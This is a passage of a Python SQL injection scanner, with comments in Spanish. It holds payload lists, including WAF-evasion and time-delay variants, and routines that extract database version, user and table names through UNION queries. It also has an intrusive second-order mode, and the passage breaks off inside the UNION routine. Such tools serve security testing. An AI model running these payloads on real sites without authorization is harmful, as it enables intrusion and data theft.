import html
import json
import re
import shlex
import statistics
import time
from difflib import SequenceMatcher
from urllib.parse import urlparse

from models.http_utils import (
    hacer_peticion, construir_url, construir_url_params, es_bloqueo,
)
from models.discovery import descubrir_objetivos


SQLI_PAYLOADS_ERROR = [
    "'", "''", '"', "1'", "' OR '1'='1", '" OR "1"="1', "'; --", "') OR ('1'='1",
    ")) OR (1=1)--", "1;--", "'' OR ''='", "\" OR \"\"=\"",
    "1) OR 1=1--", "' OR 1=1--", "' OR ''='", "' OR 'a'='a",
    "' UNION SELECT NULL--", "1' AND 1=1--", "1' AND 1=2--", "' AND 1=1--",
    "' AND 1=2--", "');--", "'); --", "')))--", "1)))--",
    "' or 1=1 --", "' OR 1=1#", "' OR 1=1/*",
]

# Variantes para saltar filtros simples: comentarios como separador, tabulador
# como espacio y mayúsculas mezcladas. Se suman a las de error-based.
SQLI_PAYLOADS_EVASION = [
    "'/**/OR/**/1=1--",
    "'\tOR\t1=1--",
    "' oR '1'='1",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1-- -",
    "'/**/OR/**/'1'='1",
    "'\nOR\n1=1--",
    "'||'1'='1",                       # concatenación (Oracle/PostgreSQL/SQLite)
    "' OR 0x31=0x31--",                # literal hexadecimal
    "' OR 1 LIKE 1--",
    "' OR 1 BETWEEN 1 AND 1--",
    "' UN/**/ION SEL/**/ECT NULL--",   # evasión de UNION con comentarios
    "1'/**/OR/**/1=1#",
    "' oR 1=1#",
]

SQLI_PAYLOADS_BOOLEAN_TRUE = [
    "' OR '1'='1", "1 OR 1=1", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1#",
    "' OR 1=1/*", "1) OR 1=1)--", "') OR ('1'='1", "1 OR 1=1;--", "' OR TRUE--",
    "' OR 2>1--", "' OR 'x'!='x", "' OR 1!=0--", "1 OR 1!=0--",
]

SQLI_PAYLOADS_BOOLEAN_FALSE = [
    "' AND '1'='2", "1 AND 1=2", "' AND 1=2--", "' AND 'a'='b", "' AND 1=2#",
    "' AND 1=2/*", "1) AND 1=2)--", "') AND ('1'='2", "1 AND 1=2;--", "' AND FALSE--",
    "' AND 2>1--", "' AND 'x'='x", "' AND 1!=1--", "1 AND 1!=1--",
]

SQLI_PAYLOADS_TIME = [
    ("MySQL", "'; SLEEP(5) --", 5), ("MySQL", "'; BENCHMARK(5000000,MD5('test')) --", 5),
    ("PostgreSQL", "'; SELECT pg_sleep(5) --", 5), ("SQLite", "'; SELECT randomblob(50000000) --", 5),
    ("SQL Server", "'; WAITFOR DELAY '0:0:5' --", 5), ("Oracle", "'; DBMS_LOCK.SLEEP(5) --", 5),
    ("MariaDB", "'; SLEEP(5) --", 5),
    # SQLite no tiene SLEEP: se usa una CTE recursiva que consume CPU (~2 s).
    ("SQLite", "' OR (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c "
               "WHERE x<10000000) SELECT count(*) FROM c)>0--", 2),
]

# Firmas específicas de errores SQL. Se evitaron cadenas demasiado genéricas
# ("msg ", "sql server", "psql", "pg_", "oracle", "sqlstate", "near \"") que
# provocaban falsos positivos en páginas con contenido legítimo.
ERROR_SIGNATURES = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
              "mysql_num_rows", "mysql_connect", "mysql_query", "mysql_error"],
    "PostgreSQL": ["pg_query", "syntax error at or near", "postgresql",
                   "unrecognized configuration parameter"],
    "SQL Server": ["microsoft sql server", "unclosed quotation mark",
                   "odbc sql server driver", "incorrect syntax near"],
    "Oracle": ["ora-"],
    "SQLite": ["sqlite3", "sqlite_", "unrecognized token"],
    "Generic": ["sql syntax", "database error", "sql error", "database returned",
                "unexpected end of sql command", "quoted string not properly terminated",
                "different number of columns", "equal number of expressions",
                "same number of result columns"],
}

SQLI_DB_ORDER = ["MySQL", "PostgreSQL", "SQL Server", "Oracle", "SQLite", "MariaDB", "Generic"]


def _normalizar_respuesta(texto: str) -> str:
    texto = re.sub(r"<script[^>]*>.*?</script>", " ", texto, flags=re.DOTALL | re.IGNORECASE)
    texto = re.sub(r"<style[^>]*>.*?</style>", " ", texto, flags=re.DOTALL | re.IGNORECASE)
    texto = re.sub(r"<[^>]+>", " ", texto)
    # Decodifica entidades HTML, incluidas las hex (&#x27; -> '), para poder
    # neutralizar el eco de la entrada y detectar reflejos escapados.
    texto = html.unescape(texto)
    texto = re.sub(r"\s+", " ", texto)
    return texto.strip().lower()


# Contenido que cambia en cada petición (tokens CSRF, hashes, UUID, timestamps).
# Se elimina antes de comparar respuestas para no confundir el ruido normal de
# una página dinámica con una inyección real.
_VOLATIL = [
    re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.IGNORECASE),
    re.compile(r"[a-f0-9]{16,}", re.IGNORECASE),
    re.compile(r"[A-Za-z0-9+/]{24,}={0,2}"),
    re.compile(r"\b\d{10,13}\b"),
    re.compile(r"(csrf|xsrf|token|nonce|authenticity)[\"'\s:=]+[^\"'\s<>&]+", re.IGNORECASE),
]


def _normalizar_volatil(texto: str) -> str:
    t = _normalizar_respuesta(texto)
    for patron in _VOLATIL:
        t = patron.sub(" ", t)
    return re.sub(r"\s+", " ", t).strip()


class SQLiModel:
    def __init__(self, timeout: int = 5, time_threshold: float = 2.0,
                 time_runs: int = 3, max_objetivos: int = 8,
                 baseline_runs: int = 2, confirmar: bool = True,
                 headers: dict | None = None, pausa: float = 0.0,
                 max_peticiones: int = 4000, probar_cabeceras: bool = False,
                 probar_json: bool = True, extraer: bool = True,
                 probar_apis: bool = True, usar_navegador: bool = False,
                 segundo_orden: bool = False, abortar_waf: bool = True,
                 max_pares_boolean: int = 80, tiempo_maximo: float = 600.0):
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.time_runs = time_runs
        self.max_objetivos = max_objetivos
        self.baseline_runs = max(1, baseline_runs)
        self.confirmar = confirmar
        # Cabeceras extra (Cookie, Authorization, User-Agent...) para objetivos
        # que requieren sesión, y control de cortesía/presupuesto.
        self.headers = headers or {}
        self.pausa = pausa
        self.max_peticiones = max_peticiones
        # Alcance: probar cabeceras, probar cuerpo JSON y extraer datos (versión).
        self.probar_cabeceras = probar_cabeceras
        self.probar_json = probar_json
        self.extraer = extraer
        self.probar_apis = probar_apis
        self.usar_navegador = usar_navegador
        self.segundo_orden = segundo_orden  # INTRUSIVO: escribe datos en el objetivo
        self.abortar_waf = abortar_waf
        # Rendimiento: corta el boolean si no hay señal tras N pares, y un tope
        # de tiempo global para que un escaneo no se eternice.
        self.max_pares_boolean = max(20, max_pares_boolean)
        self.tiempo_maximo = tiempo_maximo
        self._inicio = None
        self._motivo_parada = None
        self._peticiones = 0
        self._bloqueado = False
        self._notas = []  # diagnóstico: por qué se descartó/omitió algo

    def _nota(self, mensaje: str):
        if len(self._notas) < 40 and mensaje not in self._notas:
            self._notas.append(mensaje)

    # ------------------------------------------------------------ reproducción
    def _curl(self, objetivo: dict, payload: str) -> str:
        """Comando curl para reproducir manualmente un hallazgo."""
        ubic = objetivo.get("ubicacion", "query")
        url = shlex.quote(objetivo["url"])
        if ubic == "header":
            cabecera = f"{objetivo['param']}: {payload}"
            return f"curl -s -H {shlex.quote(cabecera)} {url}"
        if ubic == "json":
            datos = dict(objetivo.get("params", {}))
            datos[objetivo["param"]] = payload
            return (f"curl -s -X POST -H 'Content-Type: application/json' {url} "
                    f"-d {shlex.quote(json.dumps(datos))}")
        if objetivo["method"] == "POST":
            datos = dict(objetivo.get("params", {}))
            datos[objetivo["param"]] = payload
            partes = " ".join(f"--data-urlencode {shlex.quote(f'{k}={v}')}" for k, v in datos.items())
            return f"curl -s -X POST {url} {partes}"
        final = construir_url_params(objetivo["url"], objetivo.get("params", {}))
        final = construir_url(final, objetivo["param"], payload)
        return f"curl -s {shlex.quote(final)}"

    # ------------------------------------------------------------------ envío
    def _enviar(self, objetivo: dict, valor: str, timeout: int | None = None):
        """Inyecta `valor` en el parámetro del objetivo (GET o POST).

        Contabiliza peticiones (presupuesto), aplica la pausa de cortesía y
        marca `_bloqueado` si el objetivo responde con WAF/rate-limit.
        """
        if self._bloqueado:
            return None, 0, "bloqueado"
        if self.tiempo_maximo and self._inicio is not None:
            if (time.perf_counter() - self._inicio) > self.tiempo_maximo:
                self._bloqueado = True
                self._motivo_parada = self._motivo_parada or "tiempo"
                self._nota(f"Tiempo máximo alcanzado ({self.tiempo_maximo:.0f}s): análisis detenido.")
                return None, 0, "tiempo agotado"
        self._peticiones += 1
        if self._peticiones > self.max_peticiones:
            self._bloqueado = True
            self._motivo_parada = self._motivo_parada or "presupuesto"
            self._nota(f"Presupuesto de peticiones agotado ({self.max_peticiones}): análisis detenido.")
            return None, 0, "presupuesto de peticiones agotado"

        t = timeout or self.timeout
        ubic = objetivo.get("ubicacion", "query")
        if ubic == "header":
            # Inyección en una cabecera (User-Agent, Referer, X-Forwarded-For...).
            cabeceras = dict(self.headers)
            cabeceras[objetivo["param"]] = valor
            datos = objetivo.get("params") if objetivo.get("method") == "POST" else None
            resp, el, err = hacer_peticion(
                objetivo["url"], timeout=t, method=objetivo.get("method", "GET"),
                data=datos, headers=cabeceras, pausa=self.pausa,
            )
        elif ubic == "json":
            datos = dict(objetivo.get("params", {}))
            datos[objetivo["param"]] = valor
            cabeceras = {"Content-Type": "application/json", **self.headers}
            resp, el, err = hacer_peticion(
                objetivo["url"], timeout=t, method="POST", json=datos,
                headers=cabeceras, pausa=self.pausa,
            )
        elif objetivo["method"] == "POST":
            datos = dict(objetivo.get("params", {}))
            datos[objetivo["param"]] = valor
            resp, el, err = hacer_peticion(
                objetivo["url"], timeout=t, method="POST", data=datos,
                headers=self.headers, pausa=self.pausa,
            )
        else:
            url = construir_url_params(objetivo["url"], objetivo.get("params", {}))
            url = construir_url(url, objetivo["param"], valor)
            resp, el, err = hacer_peticion(url, timeout=t, headers=self.headers, pausa=self.pausa)

        if resp is not None and es_bloqueo(resp):
            self._nota(f"WAF/rate-limit detectado (HTTP {resp.status_code}).")
            if self.abortar_waf:
                self._bloqueado = True
                self._motivo_parada = self._motivo_parada or "waf"
        return resp, el, err

    # --------------------------------------------------------------- análisis
    def analizar(self, url: str, callback=None) -> dict:
        self._inicio = time.perf_counter()
        if callback:
            callback(0.02, "Descubriendo parámetros en la página...")

        objetivos, info = descubrir_objetivos(
            url, probar_cabeceras=self.probar_cabeceras, probar_json=self.probar_json,
            probar_apis=self.probar_apis, usar_navegador=self.usar_navegador,
        )

        if not objetivos:
            return {
                "url": url, "vulnerable": False, "parametros_probados": [],
                "hallazgos": [], "objetivos": [], "descubrimiento": info,
                "detalle": info.get("mensaje") or "No se encontraron parámetros ni formularios que analizar.",
            }

        truncado = len(objetivos) > self.max_objetivos
        if truncado:
            objetivos = objetivos[:self.max_objetivos]

        parametros_probados = [f"{o['param']} ({o['method']})" for o in objetivos]
        n = len(objetivos)
        hallazgos = []

        for i, objetivo in enumerate(objetivos):
            base_progress = 0.05 + (i / n) * 0.9
            step = 0.9 / (n * 4)
            etiqueta = f"[{objetivo['param']} · {objetivo['method']}]"

            if callback:
                callback(base_progress, f"{etiqueta} Error-based (1/4)...")
            hallazgos.extend(self._error_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + p * step, m) if callback else None,
            ))
            if self._bloqueado:
                break

            if callback:
                callback(base_progress + step, f"{etiqueta} Boolean-based (2/4)...")
            hallazgos.extend(self._boolean_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + step + p * step, m) if callback else None,
            ))
            if self._bloqueado:
                break

            if callback:
                callback(base_progress + 2 * step, f"{etiqueta} UNION-based (3/4)...")
            hallazgos.extend(self._union_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + 2 * step + p * step, m) if callback else None,
            ))
            if self._bloqueado:
                break

            if callback:
                callback(base_progress + 3 * step, f"{etiqueta} Time-based (4/4)...")
            hallazgos.extend(self._time_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + 3 * step + p * step, m) if callback else None,
            ))
            if self._bloqueado:
                break

        if callback:
            callback(1.0, "Análisis completo")

        if self.segundo_orden and not self._bloqueado:
            so = self.analizar_segundo_orden(url)
            hallazgos.extend(so["hallazgos"])

        vulnerable = len(hallazgos) > 0
        fuentes = []
        if info.get("formularios"):
            fuentes.append(f"{info['formularios']} formulario(s)")
        if info.get("enlaces_con_params"):
            fuentes.append(f"{info['enlaces_con_params']} enlace(s) con parámetros")
        if any(o["origen"] == "url" for o in objetivos):
            fuentes.append("parámetros de la URL")
        resumen = ", ".join(fuentes) if fuentes else "puntos detectados"

        if vulnerable:
            detalle = (f"Se analizaron {n} punto(s) de inyección ({resumen}) y se "
                       f"detectaron {len(hallazgos)} hallazgo(s).")
        else:
            detalle = (f"No se detectaron signos claros de inyección SQL en {n} punto(s) "
                       f"de inyección ({resumen}).")
        if truncado:
            detalle += f" Se limitó el análisis a {self.max_objetivos} parámetros."
        if self._motivo_parada == "presupuesto":
            detalle += f" Se alcanzó el límite de {self.max_peticiones} peticiones (sube el máximo para continuar)."
        elif self._motivo_parada == "tiempo":
            detalle += f" Se alcanzó el tiempo máximo de {self.tiempo_maximo:.0f}s."
        elif self._motivo_parada == "waf":
            detalle += " El objetivo bloqueó o limitó las peticiones (WAF/rate-limit): se detuvo el análisis."

        return {
            "url": url, "vulnerable": vulnerable, "parametros_probados": parametros_probados,
            "hallazgos": hallazgos, "objetivos": objetivos,
            "descubrimiento": info, "detalle": detalle,
            "diagnostico": list(self._notas),
        }

    # ------------------------------------------------------------- técnicas
    def analizar_segundo_orden(self, url: str, callback=None) -> dict:
        """Heurística de SQLi de SEGUNDO ORDEN (INTRUSIVA: escribe datos).

        Inyecta un payload en los formularios y luego revisita páginas del mismo
        host buscando errores SQL que NO aparecían antes de inyectar. Es
        heurístico: puede dar ruido.
        """
        from models.discovery import listar_paginas

        if self._inicio is None:
            self._inicio = time.perf_counter()
        if callback:
            callback(0.05, "Segundo orden: buscando formularios de escritura...")
        objetivos, _ = descubrir_objetivos(
            url, probar_cabeceras=False, probar_json=self.probar_json,
            probar_apis=self.probar_apis,
        )
        formularios = [o for o in objetivos if o["method"] in ("POST", "PUT", "PATCH")]
        if not formularios:
            return {"url": url, "vulnerable": False, "hallazgos": [], "tipo": "segundo-orden",
                    "detalle": "No hay formularios/endpoints de escritura donde inyectar."}
        formularios = formularios[:6]

        # Estabilizar el estado: sobrescribe cualquier valor previo (p. ej. de un
        # escaneo anterior) con un valor benigno ANTES de la línea base, para que
        # el estado inicial sea el "normal" y no uno ya contaminado.
        for o in formularios:
            self._enviar(o, "VulnWebControl")

        paginas = listar_paginas(url, limite=10)
        if callback:
            callback(0.2, f"Línea base sobre {len(paginas)} página(s)...")
        firmas_base = {}
        for p in paginas:
            resp, _, _ = hacer_peticion(p, headers=self.headers, pausa=self.pausa)
            firmas_base[p] = (set(self._firmas_error(resp.text.lower(), str(resp.headers).lower()))
                              if resp is not None else set())

        payloads = ["'", "VulnWeb2do'--"]
        for idx, payload in enumerate(payloads):
            if self._bloqueado:
                break
            if callback:
                callback(0.3 + idx * 0.35, f"Segundo orden: inyectando y revisando ({idx+1}/{len(payloads)})...")
            for o in formularios:
                self._enviar(o, payload)
                # Revisar DESPUÉS DE CADA inyección (una inyección posterior podría
                # sobrescribir el valor almacenado).
                for p in paginas:
                    resp, _, _ = hacer_peticion(p, headers=self.headers, pausa=self.pausa)
                    if resp is None:
                        continue
                    firmas = set(self._firmas_error(resp.text.lower(), str(resp.headers).lower()))
                    nuevas = firmas - firmas_base.get(p, set())
                    if nuevas:
                        dbs = sorted({clave[0] for clave in nuevas})
                        firmas_txt = "; ".join(sorted({clave[1] for clave in nuevas})[:3])
                        hallazgo = {
                            "tipo": "second-order", "parametro": o["param"],
                            "metodo": o["method"], "url_objetivo": o["url"],
                            "origen": "segundo-orden",
                            "payload": payload, "severidad": "Alta", "confianza": 70,
                            "motor_sugerido": ", ".join(dbs),
                            "pagina_disparo": p,
                            "evidencia": (f"Tras inyectar en {o['url']}, la página "
                                          f"{urlparse(p).path or '/'} devolvió un error SQL nuevo: {firmas_txt}."),
                            "reproducir": self._curl(o, payload),
                        }
                        hallazgo["cvss"] = 0
                        hallazgo["nivel_riesgo"] = ""
                        hallazgo["explicacion"] = ""
                        if callback:
                            callback(1.0, "Segundo orden: hallazgo encontrado")
                        return {"url": url, "vulnerable": True, "hallazgos": [hallazgo],
                                "tipo": "segundo-orden",
                                "detalle": ("Posible SQLi de segundo orden: una inyección almacenada "
                                            "provoca un error SQL en otra página.")}

        if callback:
            callback(1.0, "Segundo orden completado")
        return {"url": url, "vulnerable": False, "hallazgos": [], "tipo": "segundo-orden",
                "detalle": "No se detectó SQLi de segundo orden (heurístico)."}

    def _firmas_error(self, body: str, headers_str: str) -> dict:
        """Firmas de error SQL presentes, con detalle de dónde aparecen."""
        encontradas = {}
        for db in SQLI_DB_ORDER:
            for firma in ERROR_SIGNATURES.get(db, []):
                firma_lower = firma.lower()
                en_body = firma_lower in body
                en_headers = firma_lower in headers_str
                if en_body or en_headers:
                    encontradas[(db, firma_lower)] = {
                        "db": db, "firma": firma,
                        "en_body": en_body, "en_headers": en_headers,
                    }
        return encontradas

    def _error_based(self, objetivo: dict, sub_callback=None) -> list:
        payloads = SQLI_PAYLOADS_ERROR + SQLI_PAYLOADS_EVASION
        total = len(payloads)

        # Línea base: firmas que ya aparecen sin inyectar. Se restan para no
        # reportar como vulnerabilidad texto SQL legítimo de la página.
        resp_base, _, err_base = self._enviar(objetivo, objetivo.get("valor_base", ""))
        firmas_base = set()
        if resp_base is not None and not err_base:
            firmas_base = set(
                self._firmas_error(resp_base.text.lower(), str(resp_base.headers).lower())
            )

        firmas_encontradas = {}
        payload_principal = SQLI_PAYLOADS_ERROR[0]
        mejor_status = None

        for i, payload in enumerate(payloads):
            if sub_callback:
                sub_callback(i / total, f"  Probando payload {i+1}/{total}: {payload[:30]}...")

            response, _, error = self._enviar(objetivo, payload)

            if error or response is None:
                if mejor_status is None:
                    mejor_status = response.status_code if response is not None else 0
                continue

            if mejor_status is None:
                mejor_status = response.status_code

            nuevas = {
                clave: data
                for clave, data in self._firmas_error(
                    response.text.lower(), str(response.headers).lower()
                ).items()
                if clave not in firmas_base
            }
            if nuevas:
                payload_principal = payload
                firmas_encontradas.update(nuevas)

        if sub_callback:
            sub_callback(1.0, "  Error-based completado")

        if not firmas_encontradas:
            return []

        # Confirmación: repetir el payload que disparó el error y exigir que
        # vuelva a aparecer (descarta fallos puntuales del servidor).
        if self.confirmar and payload_principal:
            resp_c, _, err_c = self._enviar(objetivo, payload_principal)
            if err_c or resp_c is None:
                return []
            firmas_conf = {
                clave: data
                for clave, data in self._firmas_error(
                    resp_c.text.lower(), str(resp_c.headers).lower()
                ).items()
                if clave not in firmas_base
            }
            if not firmas_conf:
                self._nota("error-based: el error SQL no se reprodujo al confirmar (posible falso negativo).")
                return []

        firmas_lista = list(firmas_encontradas.values())
        confidence = self._calcular_confianza_error(firmas_lista, mejor_status)

        dbs_detectadas = {f["db"] for f in firmas_lista}
        dbs_distintas = [db for db in SQLI_DB_ORDER if db in dbs_detectadas]
        if len(dbs_distintas) > 1:
            dbs_distintas = [d for d in dbs_distintas if d != "Generic"] or dbs_distintas
        firmas_texto = "; ".join(f"{f['firma']}" for f in firmas_lista[:5])
        ambito = []
        for f in firmas_lista[:3]:
            partes = [lugar for lugar, ok in (("cuerpo", f["en_body"]), ("headers", f["en_headers"])) if ok]
            ambito.append(f"{f['db']} ({'+'.join(partes)})")

        hallazgo = {
            "tipo": "error-based", "parametro": objetivo["param"],
            "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
            "origen": objetivo.get("origen", ""),
            "payload": payload_principal, "severidad": "Alta", "confianza": confidence,
            "motor_sugerido": ", ".join(dbs_distintas),
            "firmas_detectadas": len(firmas_encontradas), "motivos": firmas_texto,
            "evidencia": f"Firmas SQL en {', '.join(ambito)}: {firmas_texto}",
            "codigo_http": mejor_status,
            "reproducir": self._curl(objetivo, payload_principal),
        }
        hallazgo["cvss"] = 0
        hallazgo["nivel_riesgo"] = ""
        hallazgo["explicacion"] = ""
        return [hallazgo]

    @staticmethod
    def _sin_eco(texto: str, payload: str) -> str:
        """Elimina de la respuesta el valor inyectado reflejado (eco)."""
        eco = _normalizar_respuesta(payload)
        if eco and eco in texto:
            texto = texto.replace(eco, " ")
        return texto

    def _evaluar_par(self, norm_true: str, norm_false: str, st_true: int, st_false: int,
                     status_base: int, ruido: float):
        """Compara dos respuestas normalizadas. Devuelve (indicadores, detalles, diff) o None."""
        mayor = max(len(norm_true), len(norm_false))
        if mayor < 40:
            return None

        ind = {"status": 0, "tamano": 0, "similitud": 0}
        det = {}
        if st_true != st_false:
            ind["status"] = 1
            det["status"] = f"status {st_true} (true) / {st_false} (false); base {status_base}"

        diff_pct = abs(len(norm_true) - len(norm_false)) / mayor * 100
        umbral = max(5.0, ruido * 100)
        if diff_pct > max(10.0, umbral):
            ind["tamano"] = 2
            det["tamano"] = f"diferencia true/false {round(diff_pct, 2)}%"
        elif diff_pct > umbral:
            ind["tamano"] = 1
            det["tamano"] = f"diferencia true/false {round(diff_pct, 2)}%"

        sim_tf = SequenceMatcher(None, norm_true, norm_false).ratio()
        umbral_sim = 0.93 - ruido
        if sim_tf < umbral_sim - 0.08:
            ind["similitud"] = 2
            det["similitud"] = f"similitud true/false {round(sim_tf, 4)}"
        elif sim_tf < umbral_sim:
            ind["similitud"] = 1
            det["similitud"] = f"similitud true/false {round(sim_tf, 4)}"

        return ind, det, diff_pct

    def _par_boolean(self, objetivo: dict, payload_true: str, payload_false: str,
                     status_base: int, ruido: float):
        """Envía un par TRUE/FALSE y lo evalúa. Devuelve (indicadores, detalles, diff) o None."""
        response_true, _, error_true = self._enviar(objetivo, payload_true)
        response_false, _, error_false = self._enviar(objetivo, payload_false)

        if error_true or error_false or response_true is None or response_false is None:
            return None
        # Un error del servidor (5xx) no es una señal booleana fiable.
        if response_true.status_code >= 500 or response_false.status_code >= 500:
            return None

        norm_true = self._sin_eco(_normalizar_volatil(response_true.text), payload_true)
        norm_false = self._sin_eco(_normalizar_volatil(response_false.text), payload_false)
        return self._evaluar_par(norm_true, norm_false,
                                 response_true.status_code, response_false.status_code,
                                 status_base, ruido)

    def _boolean_based(self, objetivo: dict, sub_callback=None) -> list:
        # Línea base: varias muestras sin inyectar para medir el "ruido" natural
        # de la página (tokens, contenido dinámico, etc.).
        muestras = []
        status_base = None
        for _ in range(self.baseline_runs):
            resp, _, err = self._enviar(objetivo, objetivo.get("valor_base", "1"))
            if err or resp is None:
                if sub_callback:
                    sub_callback(1.0, "  Sin respuesta base válida")
                return []
            if resp.status_code >= 500:
                self._nota("boolean: la página base devuelve 5xx (técnica omitida).")
                if sub_callback:
                    sub_callback(1.0, "  Página base con error del servidor")
                return []
            status_base = resp.status_code
            muestras.append(resp)

        if len(muestras[0].text) < 50:
            self._nota("boolean: respuesta base muy pequeña (técnica omitida).")
            if sub_callback:
                sub_callback(1.0, "  Respuesta base demasiado pequeña para boolean-based")
            return []

        base_norm = _normalizar_volatil(muestras[0].text)
        ruido = 0.0
        if len(muestras) > 1:
            ruido = 1 - SequenceMatcher(None, base_norm, _normalizar_volatil(muestras[1].text)).ratio()
        if ruido > 0.25:
            self._nota(f"boolean: página demasiado volátil (ruido {ruido:.2f}; técnica omitida). "
                       "Si sospechas inyección, baja la exigencia de ruido o revisa manualmente.")
            if sub_callback:
                sub_callback(1.0, f"  Página demasiado volátil (ruido {ruido:.2f})")
            return []

        indicadores = {"status": 0, "tamano": 0, "similitud": 0}
        detalles = {}
        max_diff_pct = 0.0
        mejor = None

        pares = 0
        for payload_true in SQLI_PAYLOADS_BOOLEAN_TRUE:
            for payload_false in SQLI_PAYLOADS_BOOLEAN_FALSE:
                # Rendimiento: si tras N pares no hay señal (< 3 puntos) se corta.
                if pares >= self.max_pares_boolean and sum(indicadores.values()) < 3:
                    if sub_callback:
                        sub_callback(1.0, "  Boolean-based: sin señal suficiente (cortado)")
                    return []
                pares += 1
                res = self._par_boolean(objetivo, payload_true, payload_false, status_base, ruido)
                if not res:
                    continue
                ind, det, diff = res
                for clave, valor in ind.items():
                    indicadores[clave] = max(indicadores[clave], valor)
                detalles.update(det)
                max_diff_pct = max(max_diff_pct, diff)
                if mejor is None or sum(ind.values()) > sum(mejor[2].values()):
                    mejor = (payload_true, payload_false, ind)
                if sum(indicadores.values()) >= 4:
                    break
            if sum(indicadores.values()) >= 4:
                break

        if sub_callback:
            sub_callback(1.0, "  Boolean-based completado")

        puntos = sum(indicadores.values())
        if puntos < 3:
            return []

        # Confirmación con REPRODUCIBILIDAD: el mismo payload debe devolver la
        # misma respuesta. Así se descarta un WAF que devuelve contenido
        # aleatorio (parecería una diferencia TRUE/FALSE sin serlo).
        if self.confirmar and mejor is not None:
            pt, pf, _ = mejor
            rt1, _, e1 = self._enviar(objetivo, pt)
            rf1, _, e2 = self._enviar(objetivo, pf)
            rt2, _, e3 = self._enviar(objetivo, pt)
            rf2, _, e4 = self._enviar(objetivo, pf)
            if (e1 or e2 or e3 or e4 or None in (rt1, rf1, rt2, rf2)
                    or any(r.status_code >= 500 for r in (rt1, rf1, rt2, rf2))):
                self._nota("boolean: no se pudo confirmar (respuestas con error o nulas).")
                return []
            nt2 = self._sin_eco(_normalizar_volatil(rt2.text), pt)
            nf2 = self._sin_eco(_normalizar_volatil(rf2.text), pf)
            repro_t = SequenceMatcher(None, nt2, self._sin_eco(_normalizar_volatil(rt1.text), pt)).ratio()
            repro_f = SequenceMatcher(None, nf2, self._sin_eco(_normalizar_volatil(rf1.text), pf)).ratio()
            if repro_t < 0.90 or repro_f < 0.90:
                self._nota("boolean: respuestas inestables para el mismo payload (no confirmado).")
                return []  # destino inestable para un mismo payload -> descartar
            confirmado = self._evaluar_par(nt2, nf2, rt2.status_code, rf2.status_code, status_base, ruido)
            if not confirmado or sum(confirmado[0].values()) < 3:
                return []
            ind2, det2, diff2 = confirmado
            for clave, valor in ind2.items():
                indicadores[clave] = max(indicadores[clave], valor)
            detalles.update(det2)
            max_diff_pct = max(max_diff_pct, diff2)
            puntos = sum(indicadores.values())

        confidence = min(100, round(puntos * 20 + max_diff_pct * 0.5, 1))
        if confidence < 50:
            confidence = min(100, round(puntos * 25, 1))

        if puntos < 4:
            severidad = "Media"
        elif puntos < 6:
            severidad = "Alta"
        else:
            severidad = "Crítica"

        payload_repr = mejor[0] if mejor else "true/false comparados"
        hallazgo = {
            "tipo": "boolean-based blind", "parametro": objetivo["param"],
            "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
            "origen": objetivo.get("origen", ""),
            "payload": payload_repr,
            "severidad": severidad, "confianza": confidence, "indicadores": dict(indicadores),
            "detalles": detalles, "diferencia_tamano_pct_max": round(max_diff_pct, 2),
            "codigo_http_base": status_base,
            "reproducir": self._curl(objetivo, payload_repr),
        }
        hallazgo["cvss"] = 0
        hallazgo["nivel_riesgo"] = ""
        hallazgo["explicacion"] = ""
        return [hallazgo]

    @staticmethod
    def _tokens_nuevos(base_norm: str, norm: str, limite: int = 12) -> list:
        base = set(re.findall(r"[a-z0-9_]{2,}", base_norm))
        ruido = {"none", "null", "nan", "true", "false"}
        return [t for t in re.findall(r"[a-z0-9_]{2,}", norm)
                if t not in base and t not in ruido][:limite]

    def _extraer_union(self, objetivo: dict, columnas: int) -> dict:
        """Extracción acotada vía UNION: versión, base de datos, usuario y tablas."""
        if not self.extraer or columnas < 1:
            return {}
        base_resp, _, _ = self._enviar(objetivo, objetivo.get("valor_base", "1"))
        base_norm = _normalizar_volatil(base_resp.text) if base_resp is not None else ""
        firmas_base = (set(self._firmas_error(base_resp.text.lower(), str(base_resp.headers).lower()))
                       if base_resp is not None else set())
        relleno = ",".join(["NULL"] * (columnas - 1))
        extracciones = [
            ("version", ["version()", "sqlite_version()"]),
            ("base_datos", ["database()", "current_database()", "db_name()"]),
            ("usuario", ["current_user", "user()", "system_user"]),
            ("tablas", [
                "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
                "(SELECT group_concat(table_name) FROM information_schema.tables)",
                "(SELECT string_agg(table_name,',') FROM information_schema.tables)",
            ]),
        ]
        datos = {}
        for etiqueta, expresiones in extracciones:
            for expresion in expresiones:
                payload = f"' UNION SELECT {expresion}{',' + relleno if relleno else ''}-- "
                resp, _, err = self._enviar(objetivo, payload)
                if self._bloqueado or err or resp is None or resp.status_code >= 500:
                    continue
                norm = _normalizar_volatil(resp.text)
                if "union select" in norm or _normalizar_respuesta(payload) in norm:
                    continue
                # Si la respuesta es un error SQL, no es un dato extraído.
                if set(self._firmas_error(resp.text.lower(), str(resp.headers).lower())) - firmas_base:
                    continue
                if etiqueta == "version":
                    m = re.search(r"\d+\.\d+(\.\d+)?([\-_a-z0-9]+)?", norm)
                    if m and m.group(0) not in base_norm:
                        datos[etiqueta] = m.group(0)
                        break
                else:
                    nuevos = self._tokens_nuevos(base_norm, norm)
                    if nuevos:
                        datos[etiqueta] = ",".join(nuevos) if etiqueta == "tablas" else nuevos[0]
                        break
            if self._bloqueado:
                break
        return datos

    def _union_based(self, objetivo: dict, sub_callback=None) -> list:
        """Detecta inyección UNION enumerando el número de columnas."""
        base_resp, _, err = self._enviar(objetivo, objetivo.get("valor_base", "1"))
        if err or base_resp is None or base_resp.status_code >= 500:
            return []
        base_norm = _normalizar_volatil(base_resp.text)
        firmas_base = set(self._firmas_error(base_resp.text.lower(), str(base_resp.headers).lower()))

        total = 10
        for n in range(1, total + 1):
            if sub_callback:
                sub_callback(n / total, f"  UNION SELECT con {n} columna(s)...")
